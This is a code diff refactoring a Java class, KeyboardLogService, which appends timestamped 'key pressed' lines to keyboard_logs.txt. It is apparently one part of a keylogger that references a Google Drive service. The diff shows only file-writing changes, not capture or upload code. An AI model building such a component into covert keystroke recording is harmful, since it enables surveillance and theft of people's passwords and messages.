@@ -10,10 +10,9 @@ import java.util.logging.Level;
 import java.util.logging.Logger;
 
 public class KeyboardLogService {
-    private String fileName;
+    private static final String FILE_PATH = "keyboard_logs.txt";
     
     public KeyboardLogService() {
-        this.fileName = "keyboard_logs.txt";
         this.writeHeader();
     }
     
@@ -23,7 +22,7 @@ public class KeyboardLogService {
     }
     
     private void writeHeader() {
-        File keyboardLogFile = new File(this.fileName);
+        File keyboardLogFile = new File(FILE_PATH);
         
         if (!keyboardLogFile.exists()) {
             this.writeInFile("Data e Hora             Tecla Pressionada");
@@ -32,8 +31,7 @@ public class KeyboardLogService {
     }
     
     private void writeInFile(String textLine) {
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter(this.fileName, true))) {
-            // O segundo parâmetro "true" indica que você deseja abrir o arquivo em modo de anexação
+        try (BufferedWriter writer = new BufferedWriter(new FileWriter(FILE_PATH, true))) {
             writer.write(textLine + "\n");
         } catch (IOException ex) {
             Logger.getLogger(GoogleDriveService.class.getName()).log(Level.SEVERE, null, ex);
@@ -44,5 +42,9 @@ public class KeyboardLogService {
         LocalDateTime currentDateTime = LocalDateTime.now();
         DateTimeFormatter formatter = DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm:ss");
         return currentDateTime.format(formatter);
+    }
+    
+    public static String getFilePath() {
+        return FILE_PATH;
     }
 }
